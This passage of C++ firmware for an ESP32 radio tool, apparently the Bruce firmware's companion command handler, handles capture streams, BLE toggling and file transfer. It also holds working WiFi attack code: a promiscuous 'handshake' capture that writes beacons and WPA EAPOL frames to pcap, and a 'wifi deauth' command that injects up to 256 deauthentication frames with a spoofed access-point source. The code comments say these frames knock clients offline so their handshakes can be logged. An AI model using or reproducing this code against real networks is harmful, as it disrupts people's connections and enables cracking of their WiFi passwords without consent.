        } else if (kind == "nrf") {
            if (!nrfStreamBegin()) {
                emit("ERR " + String(id) + " 4 nrf init failed (radio not found?)");
                return;
            }
        } else if (kind == "rf") {
            float a = g_rfStart, b = g_rfStop;
            int s2 = rest.indexOf(' ');
            if (s2 > 0 && rest.charAt(0) >= '0' && rest.charAt(0) <= '9') {
                a = rest.substring(0, s2).toFloat();
                b = rest.substring(s2 + 1).toFloat();
            }
            if (!rfStreamBegin(a, b)) {
                emit("ERR " + String(id) + " 4 rf init failed (CC1101 not found?)");
                return;
            }
        } else if (kind == "handshake") {
            // WiFi promiscuous packet capture (beacons + EAPOL) -> pcap. Optional
            // ch=<1..14> pins the channel (else hop); bssid=<MAC> filters the AP.
            g_hsFixedCh = (uint8_t)fieldValue(spec, "ch").toInt();
            String bs = fieldValue(spec, "bssid");
            g_hsHaveBssid = bs.length() && parseMac(bs, g_hsBssid);
            g_hsChanIdx = 0;
            g_hsDrop = 0;
            g_hsHopMs = millis();
            if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
            g_hsQueue = xQueueCreate(24, sizeof(HsPkt));
            if (!g_hsQueue) {
                emit("ERR " + String(id) + " 4 handshake queue alloc failed");
                return;
            }
            g_hsActive = true;
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(hsPromiscCb);
            uint8_t ch = g_hsFixedCh ? g_hsFixedCh : g_hsChannels[0];
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        }
        // Open the capture file (default under /BruceCapture, or an explicit path=).
        FS *fs;
        if (!getFsStorage(fs)) {
            streamTeardown();
            emit("ERR " + String(id) + " 4 no fs");
            return;
        }
        String path = fieldValue(spec, "path");
        if (path.length() == 0) {
            fs->mkdir("/BruceCapture");
            const char *ext = (kind == "handshake") ? ".pcap" : ".txt";
            path = "/BruceCapture/" + kind + "-" + String(millis()) + ext;
        }
        g_capFile = fs->open(path, FILE_WRITE, true);
        if (!g_capFile) {
            streamTeardown();
            emit("ERR " + String(id) + " 4 cannot create " + path);
            return;
        }
        g_capPath = path;
        g_capBytes = 0;
        g_capSamples = 0;
        mbedtls_sha256_init(&g_capCtx);
        mbedtls_sha256_starts(&g_capCtx, 0);
        if (kind == "handshake") {
            hsPcapGlobalHeader(); // binary libpcap header (DLT 105)
        } else {
            capWrite("# kind: " + kind + "\n");
            capWrite("# capture: companion ms=" + String(millis()) + " interval=" +
                     String(g_streamInterval) + "\n");
        }
        g_capturing = true;
        g_streaming = true;
        g_streamId = id;
        g_streamSeq = 0;
        g_streamKind = kind;
        g_streamLastMs = 0;          // first sweep immediately
        g_capProgMs = millis();      // first progress EVT after ~2s
        g_streamReply = g_reply;     // progress EVTs go to the starting transport
        g_radioOwner = "companion";
        String extra;
        if (kind == "rf") extra = " band=" + String(g_rfStart, 2) + "-" + String(g_rfStop, 2);
        else if (kind == "handshake")
            extra = String(" ch=") + (g_hsFixedCh ? String(g_hsFixedCh) : String("hop")) +
                    (g_hsHaveBssid ? " bssid=" + fieldValue(spec, "bssid") : "");
        emit("RSP " + String(id) + " capturing=" + kind + " path=" + path + " id=" + String(id) +
             " interval=" + String(g_streamInterval) + extra);
        emit("END " + String(id) + " 0");
        return;
    }
    if (payload == "companion ping") {
        emit("RSP " + String(id) + " pong");
        emit("END " + String(id) + " 0");
        return;
    }
    // Inject deauthentication frames to knock a client off an AP so it re-does the
    // 4-way handshake (which a concurrent `capture start handshake` then logs).
    // Uses esp_wifi_80211_tx; the global ieee80211_raw_frame_sanity_check override
    // (wifi_atks.cpp) lets us spoof the source AP.
    //   companion wifi deauth bssid=<MAC> [sta=<MAC>|broadcast] [ch=N] [count=N]
    if (payload.startsWith("companion wifi deauth")) {
        String bs = fieldValue(payload, "bssid");
        uint8_t ap[6], sta[6];
        if (!bs.length() || !parseMac(bs, ap)) {
            emit("ERR " + String(id) + " 6 deauth needs bssid=<MAC>");
            return;
        }
        String stArg = fieldValue(payload, "sta");
        bool bcast = (stArg.length() == 0 || stArg == "broadcast" || stArg == "ff");
        if (!bcast && !parseMac(stArg, sta)) {
            emit("ERR " + String(id) + " 6 bad sta=<MAC>");
            return;
        }
        int count = fieldValue(payload, "count").toInt();
        if (count <= 0) count = 8;
        if (count > 256) count = 256;
        String chArg = fieldValue(payload, "ch");
        if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
        if (chArg.length()) esp_wifi_set_channel((uint8_t)chArg.toInt(), WIFI_SECOND_CHAN_NONE);
        // deauth (AP -> client/broadcast), reason 7 (class-3 frame from nonassoc STA)
        uint8_t fr[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                          0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x00, 0x00, 0x07, 0x00};
        if (bcast) memset(fr + 4, 0xFF, 6);
        else memcpy(fr + 4, sta, 6);
        memcpy(fr + 10, ap, 6); // source = AP (spoofed)
        memcpy(fr + 16, ap, 6); // BSSID
        int sent = 0;
        for (int i = 0; i < count; i++) {
            if (esp_wifi_80211_tx(WIFI_IF_STA, fr, 26, false) == ESP_OK) sent++;
            // also STA -> AP direction when a specific client is targeted
            if (!bcast) {
                uint8_t fr2[26];
                memcpy(fr2, fr, 26);
                memcpy(fr2 + 4, ap, 6);   // dst = AP
                memcpy(fr2 + 10, sta, 6); // src = client
                memcpy(fr2 + 16, ap, 6);
                esp_wifi_80211_tx(WIFI_IF_STA, fr2, 26, false);
            }
            delay(2);
        }
        emit("RSP " + String(id) + " deauth bssid=" + bs + " sta=" + (bcast ? "broadcast" : stArg) +
             " sent=" + String(sent) + "/" + String(count));
        emit("END " + String(id) + " 0");
        return;
    }
#if !defined(LITE_VERSION)
    // Enable/disable the BLE API remotely. With dual-transport the global
    // serialDevice is NOT hijacked, so USB stays alive after enabling BLE — the
    // two run concurrently.
    if (payload.startsWith("companion ble")) {
        String arg = payload.substring(String("companion ble").length());
        arg.trim();
        bool on = isBLEAPIEnabled();
        if (arg == "on") {
            if (on) {
                emit("RSP " + String(id) + " ble=on already name=Bruc");
                emit("END " + String(id) + " 0");
            } else {
                emit("RSP " + String(id) + " ble=on name=Bruc");
                emit("END " + String(id) + " 0");
                enableBLEAPI(); // USB remains usable (no serialDevice switch)
            }
        } else if (arg == "off") {
            if (!on) {
                emit("RSP " + String(id) + " ble=off already");
                emit("END " + String(id) + " 0");
            } else {
                emit("RSP " + String(id) + " ble=off");
                emit("END " + String(id) + " 0");
                enableBLEAPI(); // disable BLE; USB unaffected
            }
        } else { // status
            emit("RSP " + String(id) + " ble=" + String(on ? "on" : "off"));
            emit("END " + String(id) + " 0");
        }
        return;
    }
#endif
    // file transfer (chunked base64 + sha256). Check putchunk/putend before
    // "put " (no trailing-space collision, but explicit is safer).
    if (payload.startsWith("companion file get ")) {
        doFileGet(id, payload.substring(19));
        return;
    }
    if (payload.startsWith("companion file putchunk ")) {
        doFilePutChunk(id, payload.substring(24));
        return;
    }
    if (payload == "companion file putend" || payload.startsWith("companion file putend ")) {
        doFilePutEnd(id);
        return;
    }
    if (payload.startsWith("companion file put ")) {
        doFilePutStart(id, payload.substring(19));
        return;
    }

    if (payload.startsWith("companion ")) {
        emit("ERR " + String(id) + " 3 UNSUPPORTED"); // stream/events: Phase 3b
        return;
    }

    // --- generic: run an existing CLI command, framed, NO backToMenu ---
    // Frame output to the transport this request arrived on (g_reply), so a
    // command run over BLE replies over BLE while USB stays on its own session.
    SerialDevice *prev = serialDevice;
    g_framing.setInner(g_reply ? g_reply : prev);
    g_framing.beginRequest(id);
    serialDevice = &g_framing;
    bool okCmd = cli.parse(payload);
    serialDevice = prev;
    g_framing.endRequest(okCmd ? 0 : 1);
}

void tick() {
    if (!g_streaming) return;
    g_reply = g_streamReply; // EVTs go to the transport that started the stream
    uint32_t now = millis();
    // capture: a light heartbeat over the wire (the data lines are written to the
    // file inside the sweep emitters). Emitted before the per-kind early returns.
    if (g_capturing && (now - g_capProgMs) >= 2000) {
        g_capProgMs = now;
        if (g_capFile) g_capFile.flush(); // crash-safety: don't leave data buffered
        emit("EVT " + String(g_streamId) + " capture seq=" + String(g_streamSeq) + " samples=" +
             String(g_capSamples) + " bytes=" + String(g_capBytes) +
             (g_hsActive ? " drops=" + String(g_hsDrop) : ""));
    }
    // handshake packet capture: hop channels (unless pinned) and drain the queue
    // into the pcap file. Runs every tick (no interval gate), like wifi.
    if (g_streamKind == "handshake") {
        if (!g_hsFixedCh && (now - g_hsHopMs) >= 300) {
            g_hsHopMs = now;
            g_hsChanIdx = (g_hsChanIdx + 1) % (int)sizeof(g_hsChannels);
            esp_wifi_set_channel(g_hsChannels[g_hsChanIdx], WIFI_SECOND_CHAN_NONE);
        }
        HsPkt q;
        int drained = 0;
        while (drained < 48 && g_hsQueue && xQueueReceive(g_hsQueue, &q, 0) == pdTRUE) {
            hsWritePkt(q);
            g_capSamples++;
            drained++;
        }
        return;
    }
    // WiFi manages its own cadence (async scan): poll every tick.
    if (g_streamKind == "wifi") {
        tickWifi(now);
        return;
    }
    if (g_streamLastMs != 0 && (now - g_streamLastMs) < g_streamInterval) return;
    g_streamLastMs = now;
    if (g_streamKind == "nrf") {
        emitNrfSweep(now);
        g_streamSeq++;
        return;
    }
    if (g_streamKind == "rf") {
        emitRfSweep(now);
        g_streamSeq++;
        return;
    }
    // "telemetry": live device vitals (ms / free heap).
    emitData("tick seq=" + String(g_streamSeq) + " ms=" + String(now) + " heap=" +
             String((uint32_t)ESP.getFreeHeap()));
    g_streamSeq++;
}

} // namespace companion
